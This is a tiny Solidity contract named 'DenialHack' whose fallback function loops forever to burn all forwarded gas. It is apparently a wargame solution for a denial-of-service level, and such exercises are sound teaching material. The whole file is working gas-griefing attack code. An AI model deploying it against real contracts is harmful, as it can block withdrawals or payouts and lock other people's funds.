// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


contract DenialHack {

    fallback() external payable {
        // an infinite loop will help us in drain all the gas
        while(true) {
        }
    }
 
}

